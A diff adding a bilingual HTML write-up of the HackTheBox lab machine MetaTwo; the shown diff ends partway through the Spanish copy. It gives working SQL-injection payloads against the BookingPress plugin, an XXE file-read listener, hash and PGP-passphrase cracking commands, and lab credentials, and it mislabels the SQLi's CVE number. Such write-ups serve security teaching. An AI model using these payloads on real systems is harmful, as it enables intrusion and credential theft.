@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>metatwo | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">metatwo</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running WordPress 5.6.2 with the BookingPress plugin installed, which contained an unauthenticated SQL injection vulnerability (CVE-2023-46604 equivalent). By exploiting this SQLi, I extracted WordPress user credentials from the database and successfully cracked the password hash for the <code>manager</code> user using hashcat.</p>
+                    
+                    <p>After gaining authenticated access to WordPress, I leveraged another vulnerability (CVE-2021-29447), an XXE (XML External Entity) injection in WordPress's media upload functionality. This allowed me to read arbitrary files from the server's filesystem, including sensitive configuration files. Through this XXE attack, I discovered FTP credentials in the <code>wp-config.php</code> file, and subsequently found SSH credentials for the <code>jnelson</code> user in the FTP server.</p>
+                    
+                    <p>Once logged in as <code>jnelson</code>, privilege escalation was achieved by discovering a <code>.passpie</code> directory containing encrypted password entries, including one for the root user. The passwords were protected by a PGP key with a passphrase. Using <code>gpg2john</code> to extract the PGP key hash and john to crack it, I obtained the passphrase and decrypted the root password, gaining full system access.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> WordPress BookingPress plugin unauthenticated SQLi, WordPress XXE via media upload (CVE-2021-29447), Passpie password manager PGP key cracking.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports including SSH on 22, FTP on 21, and HTTP on 80" /></p>
+
+                <p>The scan reveals several services of interest. Port 80 is running an HTTP server, port 21 has FTP (though it appears to be slow and doesn't allow anonymous access), and SSH is available on port 22. I add <code>metapress.htb</code> to my <code>/etc/hosts</code> file to resolve the domain properly.</p>
+
+                <h2>Web Enumeration - WordPress Discovery</h2>
+                <p>Visiting the web application, I identify it's running WordPress version 5.6.2, which is approximately a year and a half old compared to the machine's release date. The technology stack includes PHP 8.0.24 and nginx 1.18.0.</p>
+
+                <p>During enumeration, I confirm the existence of the <code>admin</code> user in WordPress and notice an interesting cookie named <code>wordpress_test_cookie</code> with the value "WP Cookie check".</p>
+
+                <h3>Plugin Discovery - BookingPress</h3>
+                <p>While wpscan doesn't detect any plugins initially, by examining the web application's functionality, I notice sophisticated booking features that seem too complex to be custom-built. Investigating the POST requests made during booking interactions, I observe several requests to <code>/wp-admin/admin-ajax.php</code> with actions following this pattern:</p>
+                
+                <pre><code class="language-plaintext">action=bookingpress_{action_name}</code></pre>
+
+                <p>Examining the HTML source code reveals this path:</p>
+                <pre><code class="language-plaintext">http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/</code></pre>
+
+                <p>Visiting this URL returns a 200 status code without displaying content, which confirms the plugin's existence on the server.</p>
+
+                <h2>Vulnerability Research - BookingPress SQLi</h2>
+                <p>Searching for vulnerabilities in the BookingPress plugin, I discover an unauthenticated SQL injection vulnerability: <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/">CVE in WPScan Database</a></p>
+
+                <p>The proof of concept from WPScan outlines the following exploitation steps:</p>
+                <ol>
+                    <li>Create a new "category" and associate it with a new "service" via the BookingPress admin menu (this is already set up on the target)</li>
+                    <li>Create a page with the <code>[bookingpress_form]</code> shortcode embedded (also already present)</li>
+                    <li>Visit the page as an unauthenticated user and extract the "nonce" from the source code</li>
+                    <li>Execute the SQL injection via curl</li>
+                </ol>
+
+                <h3>Extracting the Nonce</h3>
+                <p>I search the HTML source for the string <code>action:'bookingpress_front_get_category_services'</code> and extract the nonce value: <code>d5115693e9</code></p>
+
+                <h3>Testing the SQL Injection</h3>
+                <p>Using the provided proof of concept, I test the vulnerability with a UNION-based injection:</p>
+                <pre><code class="language-bash">curl 'http://metapress.htb/wp-admin/admin-ajax.php' \
+  --data 'action=bookingpress_front_get_category_services&_wpnonce=d5115693e9&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'</code></pre>
+
+                <p>The response confirms the vulnerability is exploitable:</p>
+                <pre><code class="language-json">[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"}]</code></pre>
+
+                <h2>Database Extraction with SQLMap</h2>
+                <p>To automate the data extraction process, I use sqlmap with the vulnerable parameter:</p>
+                <pre><code class="language-bash">sqlmap 'http://metapress.htb/wp-admin/admin-ajax.php' \
+  --data 'action=bookingpress_front_get_category_services&_wpnonce=d5115693e9&category_id=33&total_service=-7502) *' --batch</code></pre>
+
+                <p>SQLMap successfully identifies the injection point and confirms two exploitation techniques:</p>
+                <pre><code class="language-plaintext">Parameter: #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=d5115693e9&category_id=33&total_service=-7502) AND (SELECT 1124 FROM (SELECT(SLEEP(5)))PBcb)-- LKVn
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=d5115693e9&category_id=33&total_service=-7502) UNION ALL SELECT CONCAT(0x7176767a71,0x7564676b4a484c774e7a59574f77714b7a4a7267797a43485345664f76725a4b545667527350547a,0x71716b7871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -</code></pre>
+
+                <p>Back-end DBMS identified as: <strong>MySQL >= 5.0.12 (MariaDB fork)</strong></p>
+
+                <h3>Extracting User Credentials</h3>
+                <p>Using sqlmap's database enumeration options, I extract credentials for two WordPress users from the <code>wp_users</code> table:</p>
+                
+                <pre><code class="language-plaintext">+----+----------------------+------------------------------------+-----------------------+------------+
+| ID | user_login           | user_pass                          | user_email            | user_url   |
++----+----------------------+------------------------------------+-----------------------+------------+
+| 1  | admin                | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | http://... |
+| 2  | manager              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | <blank>    |
++----+----------------------+------------------------------------+-----------------------+------------+</code></pre>
+
+                <h2>Password Cracking</h2>
+                <p>The password hashes are in phpass format (WordPress MD5-based hash). Using hashcat with mode 400:</p>
+                <pre><code class="language-bash">hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>Successfully cracked the manager's password:</p>
+                <pre><code class="language-plaintext">$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar</code></pre>
+
+                <p>Credentials: <code>manager:partylikearockstar</code></p>
+
+                <p>I attempt to use these credentials for SSH and FTP access but without success. However, I can successfully authenticate to the WordPress admin panel with these credentials.</p>
+
+                <h2>WordPress XXE Exploitation (CVE-2021-29447)</h2>
+                <p>After logging into WordPress as the manager user, I notice the media upload functionality. This reminds me of a known vulnerability in WordPress 5.6.2: an authenticated XXE injection when uploading media files.</p>
+
+                <p>Reference: <a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5/">CVE-2021-29447 on WPScan</a></p>
+
+                <h3>Understanding the XXE Attack</h3>
+                <p>The vulnerability allows an authenticated attacker to read arbitrary files from the server by uploading a specially crafted WAV file containing malicious XML. The attack works by:</p>
+                <ol>
+                    <li>Creating a malicious WAV file with an XML payload containing an external entity reference</li>
+                    <li>Setting up an HTTP server to host a malicious DTD file</li>
+                    <li>Uploading the WAV file through WordPress media upload</li>
+                    <li>WordPress processes the XML, making a request to our server with the file contents encoded</li>
+                </ol>
+
+                <h3>Executing the XXE Attack</h3>
+                <p>I use a proof of concept from GitHub: <a href="https://github.com/0xRar/CVE-2021-29447-PoC">CVE-2021-29447 PoC</a></p>
+
+                <p>For convenience, I set up a custom Python HTTP server that automatically decodes the base64-encoded exfiltrated data:</p>
+
+                <pre><code class="language-python">from http.server import SimpleHTTPRequestHandler, HTTPServer
+import base64
+
+class CustomHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path.startswith('/?p='):
+            encoded_data = self.path.split('=')[1]
+            try:
+                decoded = base64.b64decode(encoded_data).decode('utf-8')
+                print(f"\n[+] Decoded data:\n{decoded}\n")
+            except:
+                print(f"[-] Could not decode: {encoded_data}")
+        return SimpleHTTPRequestHandler.do_GET(self)
+
+HTTPServer(('0.0.0.0', 8000), CustomHandler).serve_forever()</code></pre>
+
+                <h3>Reading Sensitive Files</h3>
+                <p>Using the XXE vulnerability, I systematically read important system files:</p>
+
+                <h4>Identifying Users</h4>
+                <p>Reading <code>/etc/passwd</code> reveals a user with shell access:</p>
+                <pre><code class="language-plaintext">jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash</code></pre>
+
+                <h4>Finding WordPress Directory</h4>
+                <p>From <code>/etc/nginx/sites-enabled/default</code>, I discover the WordPress installation path:</p>
+                <pre><code class="language-plaintext">/var/www/metapress.htb/blog</code></pre>
+
+                <h4>Extracting Configuration Credentials</h4>
+                <p>Reading <code>/var/www/metapress.htb/blog/wp-config.php</code> reveals database and FTP credentials:</p>
+                <pre><code class="language-php">/** The name of the database for WordPress */
+define( 'DB_NAME', 'blog' );
+
+/** MySQL database username */
+define( 'DB_USER', 'blog' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
+
+/** FTP Configuration */
+define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );</code></pre>
+
+                <p>I test these credentials for SSH access as <code>jnelson</code> but they don't work. However, the FTP credentials are valid.</p>
+
+                <h2>FTP Enumeration</h2>
+                <p>Connecting to the FTP server with the discovered credentials:</p>
+                <pre><code class="language-bash">ftp metapress.htb@metapress.htb</code></pre>
+
+                <p>After successful authentication, I explore the available directories:</p>
+                <pre><code class="language-plaintext">ftp> ls
+229 Entering Extended Passive Mode (|||22524|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
+drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer</code></pre>
+
+                <p>The <code>blog</code> directory contains the WordPress installation, but I don't have write permissions to upload a webshell.</p>
+
+                <h3>Finding SSH Credentials</h3>
+                <p>Exploring the <code>mailer</code> directory, I find a file named <code>send_email.php</code>. I download it using the <code>GET</code> command and discover hardcoded credentials:</p>
+                <pre><code class="language-php">$mail->Username = "jnelson@metapress.htb";
+$mail->Password = "Cb4_JmWM8zUZWMu@Ys";</code></pre>
+
+                <h2>Initial Access - SSH as jnelson</h2>
+                <p>Using the discovered credentials, I successfully connect via SSH:</p>
+                <pre><code class="language-bash">ssh jnelson@metapress.htb</code></pre>
+
+                <p>After authentication, I retrieve the user flag from <code>/home/jnelson/user.txt</code>.</p>
+
+                <h2>Privilege Escalation - Passpie Password Manager</h2>
+                <p>Exploring the system as <code>jnelson</code>, I discover an interesting directory in the user's home: <code>.passpie</code></p>
+
+                <h3>Understanding Passpie</h3>
+                <p>Passpie is a command-line password manager that stores credentials encrypted with PGP. Checking the installed version:</p>
+                <pre><code class="language-bash">jnelson@meta2:~$ passpie --version
+passpie, version 1.6.1</code></pre>
+
+                <p>Listing the stored credentials reveals entries for both <code>jnelson</code> and <code>root</code>:</p>
+                <pre><code class="language-plaintext">jnelson@meta2:~$ passpie
+╒════════╤═════════╤════════════╤═══════════╕
+│ Name   │ Login   │ Password   │ Comment   │
+╞════════╪═════════╪════════════╪═══════════╡
+│ ssh    │ jnelson │ ********   │           │
+├────────┼─────────┼────────────┼───────────┤
+│ ssh    │ root    │ ********   │           │
+╘════════╧═════════╧════════════╧═══════════╛</code></pre>
+
+                <h3>Extracting PGP Keys</h3>
+                <p>Inside the <code>.passpie</code> directory, I find a <code>.keys</code> file containing PGP private and public keys. The passwords are encrypted with these keys, which are themselves protected by a passphrase.</p>
+
+                <p>I also find the encrypted password files in <code>.passpie/ssh/</code>:</p>
+                <ul>
+                    <li><code>jnelson.pass</code> - Contains the encrypted SSH password for jnelson</li>
+                    <li><code>root.pass</code> - Contains the encrypted SSH password for root</li>
+                </ul>
+
+                <h3>Cracking the PGP Passphrase</h3>
+                <p>To decrypt these passwords, I need to crack the PGP key's passphrase. I transfer the <code>.keys</code> file to my attacking machine and use <code>gpg2john</code> to extract a crackable hash:</p>
+
+                <pre><code class="language-bash">gpg2john .keys</code></pre>
+
+                <p>Output:</p>
+                <pre><code class="language-plaintext">File .keys
+Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::.keys</code></pre>
+
+                <p>I save this hash to a file and crack it with john:</p>
+                <pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt gpghash.txt</code></pre>
+
+                <p>The passphrase is successfully cracked: <code>blink182</code></p>
+
+                <h3>Extracting Root Password</h3>
+                <p>Now with the PGP passphrase, I can decrypt the root password using passpie's <code>copy</code> command:</p>
+                <pre><code class="language-bash">jnelson@meta2:~/.passpie$ passpie copy --to=stdout ssh --passphrase=blink182
+p7qfAZt4_A1xo_0x</code></pre>
+
+                <h2>Root Access</h2>
+                <p>Using the extracted root password, I escalate privileges:</p>
+                <pre><code class="language-bash">jnelson@meta2:~/.passpie$ su
+Password: 
+root@meta2:/home/jnelson/.passpie#</code></pre>
+
+                <p>I now have root access and can retrieve the root flag from <code>/root/root.txt</code>, successfully completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba WordPress 5.6.2 con el plugin BookingPress instalado, que contenía una vulnerabilidad de inyección SQL no autenticada (equivalente a CVE-2023-46604). Explotando esta SQLi, extraje credenciales de usuarios de WordPress de la base de datos y crackeé exitosamente el hash de contraseña del usuario <code>manager</code> usando hashcat.</p>
+                    
+                    <p>Tras obtener acceso autenticado a WordPress, aproveché otra vulnerabilidad (CVE-2021-29447), una inyección XXE (XML External Entity) en la funcionalidad de subida de archivos multimedia de WordPress. Esto me permitió leer archivos arbitrarios del sistema de archivos del servidor, incluyendo archivos de configuración sensibles. A través de este ataque XXE, descubrí credenciales FTP en el archivo <code>wp-config.php</code>, y posteriormente encontré credenciales SSH para el usuario <code>jnelson</code> en el servidor FTP.</p>
+                    
+                    <p>Una vez conectado como <code>jnelson</code>, conseguí la escalada de privilegios descubriendo un directorio <code>.passpie</code> que contenía entradas de contraseñas cifradas, incluyendo una para el usuario root. Las contraseñas estaban protegidas por una clave PGP con passphrase. Usando <code>gpg2john</code> para extraer el hash de la clave PGP y john para crackearlo, obtuve la passphrase y descifré la contraseña de root, obteniendo acceso completo al sistema.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> SQLi no autenticada en plugin BookingPress de WordPress, XXE en WordPress mediante subida de archivos multimedia (CVE-2021-29447), crackeo de clave PGP del gestor de contraseñas Passpie.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22, FTP en el 21 y HTTP en el 80" /></p>
+
+                <p>El escaneo revela varios servicios de interés. El puerto 80 ejecuta un servidor HTTP, el puerto 21 tiene FTP (aunque parece ser lento y no permite acceso anónimo), y SSH está disponible en el puerto 22. Añado <code>metapress.htb</code> a mi archivo <code>/etc/hosts</code> para resolver el dominio correctamente.</p>
+
+                <h2>Enumeración Web - Descubrimiento de WordPress</h2>
+                <p>Visitando la aplicación web, identifico que está ejecutando WordPress versión 5.6.2, que tiene aproximadamente un año y medio de antigüedad en comparación con la fecha de lanzamiento de la máquina. El stack tecnológico incluye PHP 8.0.24 y nginx 1.18.0.</p>
+
+                <p>Durante la enumeración, confirmo la existencia del usuario <code>admin</code> en WordPress y noto una cookie interesante llamada <code>wordpress_test_cookie</code> con el valor "WP Cookie check".</p>
+
+                <h3>Descubrimiento de Plugin - BookingPress</h3>
+                <p>Aunque wpscan no detecta plugins inicialmente, examinando la funcionalidad de la aplicación web, observo características sofisticadas de reservas que parecen demasiado complejas para ser personalizadas. Investigando las peticiones POST realizadas durante las interacciones de reserva, observo varias peticiones a <code>/wp-admin/admin-ajax.php</code> con acciones siguiendo este patrón:</p>
+                
+                <pre><code class="language-plaintext">action=bookingpress_{nombre_accion}</code></pre>
+
+                <p>Examinando el código fuente HTML revela esta ruta:</p>
+                <pre><code class="language-plaintext">http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/</code></pre>
+
+                <p>Visitando esta URL devuelve un código de estado 200 sin mostrar contenido, lo que confirma la existencia del plugin en el servidor.</p>
+
+                <h2>Investigación de Vulnerabilidades - SQLi en BookingPress</h2>
+                <p>Buscando vulnerabilidades en el plugin BookingPress, descubro una vulnerabilidad de inyección SQL no autenticada: <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/">CVE en la base de datos de WPScan</a></p>
+
+                <p>La prueba de concepto de WPScan describe los siguientes pasos de explotación:</p>
+                <ol>
+                    <li>Crear una nueva "categoría" y asociarla con un nuevo "servicio" mediante el menú de administración de BookingPress (esto ya está configurado en el objetivo)</li>
+                    <li>Crear una página con el shortcode <code>[bookingpress_form]</code> embebido (también ya presente)</li>
+                    <li>Visitar la página como usuario no autenticado y extraer el "nonce" del código fuente</li>
+                    <li>Ejecutar la inyección SQL mediante curl</li>
+                </ol>
+
+                <h3>Extrayendo el Nonce</h3>
+                <p>Busco en el código fuente HTML la cadena <code>action:'bookingpress_front_get_category_services'</code> y extraigo el valor del nonce: <code>d5115693e9</code></p>
+
+                <h3>Probando la Inyección SQL</h3>
+                <p>Usando la prueba de concepto proporcionada, pruebo la vulnerabilidad con una inyección basada en UNION:</p>
+                <pre><code class="language-bash">curl 'http://metapress.htb/wp-admin/admin-ajax.php' \
+  --data 'action=bookingpress_front_get_category_services&_wpnonce=d5115693e9&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'</code></pre>
+
+                <p>La respuesta confirma que la vulnerabilidad es explotable:</p>
+                <pre><code class="language-json">[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"}]</code></pre>
+
+                <h2>Extracción de Base de Datos con SQLMap</h2>
+                <p>Para automatizar el proceso de extracción de datos, uso sqlmap con el parámetro vulnerable:</p>
+                <pre><code class="language-bash">sqlmap 'http://metapress.htb/wp-admin/admin-ajax.php' \
+  --data 'action=bookingpress_front_get_category_services&_wpnonce=d5115693e9&category_id=33&total_service=-7502) *' --batch</code></pre>
+
+                <p>SQLMap identifica exitosamente el punto de inyección y confirma dos técnicas de explotación:</p>
+                <pre><code class="language-plaintext">Parameter: #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=d5115693e9&category_id=33&total_service=-7502) AND (SELECT 1124 FROM (SELECT(SLEEP(5)))PBcb)-- LKVn
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=bookingpress_front_get_category_services&_wpnonce=d5115693e9&category_id=33&total_service=-7502) UNION ALL SELECT CONCAT(0x7176767a71,0x7564676b4a484c774e7a59574f77714b7a4a7267797a43485345664f76725a4b545667527350547a,0x71716b7871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -</code></pre>
+
+                <p>DBMS del backend identificado como: <strong>MySQL >= 5.0.12 (fork de MariaDB)</strong></p>
+
+                <h3>Extrayendo Credenciales de Usuarios</h3>
+                <p>Usando las opciones de enumeración de base de datos de sqlmap, extraigo credenciales de dos usuarios de WordPress de la tabla <code>wp_users</code>:</p>
+                
+                <pre><code class="language-plaintext">+----+----------------------+------------------------------------+-----------------------+------------+
+| ID | user_login           | user_pass                          | user_email            | user_url   |
++----+----------------------+------------------------------------+-----------------------+------------+
+| 1  | admin                | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | http://... |
+| 2  | manager              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | <blank>    |
++----+----------------------+------------------------------------+-----------------------+------------+</code></pre>
+
+                <h2>Crackeo de Contraseñas</h2>
+                <p>Los hashes de contraseñas están en formato phpass (hash basado en MD5 de WordPress). Usando hashcat con modo 400:</p>
+                <pre><code class="language-bash">hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>Crackeo exitosamente la contraseña del manager:</p>
+                <pre><code class="language-plaintext">$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar</code></pre>
+
+                <p>Credenciales: <code>manager:partylikearockstar</code></p>
+
+                <p>Intento usar estas credenciales para acceso SSH y FTP sin éxito. Sin embargo, puedo autenticarme exitosamente en el panel de administración de WordPress con estas credenciales.</p>
+
+                <h2>Explotación XXE en WordPress (CVE-2021-29447)</h2>
+                <p>Tras iniciar sesión en WordPress como usuario manager, observo la funcionalidad de subida de archivos multimedia. Esto me recuerda una vulnerabilidad conocida en WordPress 5.6.2: una inyección XXE autenticada al subir archivos multimedia.</p>
+
+                <p>Referencia: <a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5/">CVE-2021-29447 en WPScan</a></p>
+
+                <h3>Entendiendo el Ataque XXE</h3>
+                <p>La vulnerabilidad permite a un atacante autenticado leer archivos arbitrarios del servidor subiendo un archivo WAV especialmente diseñado que contiene XML malicioso. El ataque funciona de la siguiente manera:</p>
+                <ol>
+                    <li>Crear un archivo WAV malicioso con un payload XML conteniendo una referencia de entidad externa</li>
+                    <li>Configurar un servidor HTTP para alojar un archivo DTD malicioso</li>
+                    <li>Subir el archivo WAV a través de la subida de archivos multimedia de WordPress</li>
+                    <li>WordPress procesa el XML, haciendo una petición a nuestro servidor con el contenido del archivo codificado</li>
+                </ol>
+
+                <h3>Ejecutando el Ataque XXE</h3>
+                <p>Uso una prueba de concepto de GitHub: <a href="https://github.com/0xRar/CVE-2021-29447-PoC">PoC de CVE-2021-29447</a></p>
+
+                <p>Por comodidad, configuro un servidor HTTP personalizado de Python que automáticamente decodifica los datos exfiltrados codificados en base64:</p>
+
+                <pre><code class="language-python">from http.server import SimpleHTTPRequestHandler, HTTPServer
+import base64
+
+class CustomHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path.startswith('/?p='):
+            encoded_data = self.path.split('=')[1]
+            try:
+                decoded = base64.b64decode(encoded_data).decode('utf-8')
+                print(f"\n[+] Datos decodificados:\n{decoded}\n")
+            except:
+                print(f"[-] No se pudo decodificar: {encoded_data}")
+        return SimpleHTTPRequestHandler.do_GET(self)
+
+HTTPServer(('0.0.0.0', 8000), CustomHandler).serve_forever()</code></pre>
+
+                <h3>Leyendo Archivos Sensibles</h3>
+                <p>Usando la vulnerabilidad XXE, leo sistemáticamente archivos importantes del sistema:</p>
+
+                <h4>Identificando Usuarios</h4>
+                <p>Leyendo <code>/etc/passwd</code> revela un usuario con acceso shell:</p>
+                <pre><code class="language-plaintext">jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash</code></pre>
+
+                <h4>Encontrando el Directorio de WordPress</h4>
+                <p>Desde <code>/etc/nginx/sites-enabled/default</code>, descubro la ruta de instalación de WordPress:</p>
+                <pre><code class="language-plaintext">/var/www/metapress.htb/blog</code></pre>
+
+                <h4>Extrayendo Credenciales de Configuración</h4>
+                <p>Leyendo <code>/var/www/metapress.htb/blog/wp-config.php</code> revela credenciales de base de datos y FTP:</p>
+                <pre><code class="language-php">/** The name of the database for WordPress */
+define( 'DB_NAME', 'blog' );
+
+/** MySQL database username */
+define( 'DB_USER', 'blog' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
+
+/** FTP Configuration */
+define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );</code></pre>
+
+                <p>Pruebo estas credenciales para acceso SSH como <code>jnelson</code> pero no funcionan. Sin embargo, las credenciales FTP son válidas.</p>
+
+                <h2>Enumeración FTP</h2>
+                <p>Conectándome al servidor FTP con las credenciales descubiertas:</p>
+                <pre><code class="language-bash">ftp metapress.htb@metapress.htb</code></pre>
+
+                <p>Tras autenticarme exitosamente, exploro los directorios disponibles:</p>
+                <pre><code class="language-plaintext">ftp> ls
+229 Entering Extended Passive Mode (|||22524|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
+drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer</code></pre>
+
+                <p>El directorio <code>blog</code> contiene la instalación de WordPress, pero no tengo permisos de escritura para subir una webshell.</p>
+
+                <h3>Encontrando Credenciales SSH</h3>
+                <p>Explorando el directorio <code>mailer</code>, encuentro un archivo llamado <code>send_email.php</code>. Lo descargo usando el comando <code>GET</code> y descubro credenciales hardcodeadas:</p>
+                <pre><code class="language-php">$mail->Username = "jnelson@metapress.htb";
+$mail->Password = "Cb4_JmWM8zUZWMu@Ys";</code></pre>
+
+                <h2>Acceso Inicial - SSH como jnelson</h2>
+                <p>Usando las credenciales descubiertas, me conecto exitosamente mediante SSH:</p>
+                <pre><code class="language-bash">ssh jnelson@metapress.htb</code></pre>
+
+                <p>Tras autenticarme, recupero la flag de usuario de <code>/home/jnelson/user.txt</code>.</p>
+
+                <h2>Escalada de Privilegios - Gestor de Contraseñas Passpie</h2>
+                <p>Explorando el sistema como <code>jnelson</code>, descubro un directorio interesante en el home del usuario: <code>.passpie</code></p>
+
+                <h3>Entendiendo Passpie</h3>
+                <p>Passpie es un gestor de contraseñas de línea de comandos que almacena credenciales cifradas con PGP. Comprobando la versión instalada:</p>
+                <pre><code class="language-bash">jnelson@meta2:~$ passpie --version
+passpie, version 1.6.1</code></pre>
+
+                <p>Listando las credenciales almacenadas revela entradas tanto para <code>jnelson</code> como para <code>root</code>:</p>
+                <pre><code class="language-plaintext">jnelson@meta2:~$ passpie
+╒════════╤═════════╤════════════╤═══════════╕
+│ Name   │ Login   │ Password   │ Comment   │
+╞════════╪═════════╪════════════╪═══════════╡
+│ ssh    │ jnelson │ ********   │           │
+├────────┼─────────┼────────────┼───────────┤
+│ ssh    │ root    │ ********   │           │
+╘════════╧═════════╧════════════╧═══════════╛</code></pre>
+
+                <h3>Extrayendo Claves PGP</h3>
+                <p>Dentro del directorio <code>.passpie</code>, encuentro un archivo <code>.keys</code> que contiene claves PGP privadas y públicas. Las contraseñas están cifradas con estas claves, que a su vez están protegidas por una passphrase.</p>
+
+                <p>También encuentro los archivos de contraseñas cifradas en <code>.passpie/ssh/</code>:</p>
+                <ul>
+                    <li><code>jnelson.pass</code> - Contiene la contraseña SSH cifrada para jnelson</li>
+                    <li><code>root.pass</code> - Contiene la contraseña SSH cifrada para root</li>
+                </ul>
+
